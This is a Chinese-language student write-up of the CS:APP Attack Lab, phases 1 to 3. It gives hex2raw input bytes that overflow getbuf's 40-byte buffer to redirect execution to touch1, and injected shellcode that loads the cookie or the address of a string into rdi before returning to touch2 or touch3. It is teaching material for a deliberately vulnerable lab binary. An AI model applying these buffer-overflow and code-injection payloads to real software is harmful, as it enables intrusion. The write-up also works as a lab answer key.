注意，运行./rtarget或者ctarget可能有问题，加上-q即可

## attack1:

我使用的操作系统是Ubuntu 22.04版本，在这个版本上运行ctarget程序会出现Segmentation Fault。如果你用gdb调试会发现在__vfprintf_internal方法内部有问题，具体修复方法可以参考：[Fix CS:APP Attack Lab Segmentation Fault on Newest Ubuntu 22.04](https://blog.rijuyuezhu.top/posts/db646f34/)。建议使用更老的linux版本。我使用18是没问题的。

请先阅读attacklab.pdf

`hex2raw` 是一个字一个字的读，也就是一次读8个字节，但是字内部是小端，比如attack1.txt：`41 00 00 00 00 00 00 00`

执行./hex2raw < attack1.txt会输出 `A`。`./hex2raw < attack1.txt | ./ctarget -q`我们可以用这个命令执行程序

根据pdf的意思，我们首先要侵入一个程序，让它运行 `4017c0 <touch1>:` 。方法需要你知道栈的运行过程，当我们调用函数的时候，会自动的把程序的返回地址先压入栈中，然后再进入调用的函数，调用完成后返回，示意图如下：

```
[ 返回地址 ]        <--- 函数返回后，跳转到这里执行
[ buffer (x 字节) ]<--- 局部变量，用于存储用户输入
```

我们这个程序是从 `401968 <test>` 函数开始的

```asm
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
```

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

getbuf给栈分配了40个字节的空间，40个之后就是返回地址了。所以我们先随便输入40个字节，再把后面的八个字节换成touch1的地址4017C0就成功了。

输入
```asm
A0 00 00 00 00 00 00 00
B0 00 00 00 00 00 00 00
C0 00 00 00 00 00 00 00
D0 00 00 00 00 00 00 00
E0 00 00 00 00 00 00 00
C0 17 40 00 00 00 00 00
```

## attack2:

rsp进入getbuf的时候是0x5561dca0，rsp减40个字节就是0x5561dc78。我们需要。我们的返回地址设成栈顶，并把栈顶的内容换成一个命令的二进制，计算机会自动执行他们。90是占位符，没作用

输入
```asm
48 BF FA 97 B9 59 00 00 00 00	/*	mov rdi, 0x59B997FA	*/
68 EC 17 40 00					/*	push 0x004017EC		*/
C3  							/*	ret					*/
90 90 90 90 90 90 90 90			
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
78 dc 61 55 00 00 00 00
```

注意在 64 位模式下，push 会将 8 字节值压入栈中（即使立即数是 32 位的，也会被符号扩展为 64 位）。如果push四字节后面是一些00 00，那么会被认为是其他的指令，比如add %al, (%rax)，对应的二进制是：00 00


## attack3:

```asm
C7 44 24 28 35 39 42 39			/* mov QWORD PTR [rsp+40], 0x39423935 将 0x35 0x39 0x42 0x39 存入 [rsp + 40(0x28)] */
C7 44 24 2C 39 37 46 41			/* mov QWORD PTR [rsp+44], 0x41463739 将 0x39 0x37 0x46 0x41 存入 [rsp + 44(0x2c)] */
C6 44 24 30 00					/* mov BYTE PTR [rsp+48], 0x00 将 0x00 存入 [rsp + 48(0x30)] （字符串的结束符） 	*/
48 8d 7c 24 28					/*	lea rdi, [rsp+40(0x28)]				*/
68 FA 18 40 00					/*	push 0x004018FA						*/
C3  							/*	ret									*/
90 90 90 90 90 90 90 90			/*	占位符								*/ 
78 dc 61 55 00 00 00 00			/*	0x5561dc78							*/ 
```

第三题和第二题很像，但是第三题我们需要返回字符串的地址，我们可以把字符串存在栈里面，开始我是直接存在离栈很近的地方的，后来发现都被覆盖了，其实题目也提示了这一点。我存在rsp+40的地方就没问题了。然后把字符串开始的地址存入rdi就行了。注意字符串需要小写。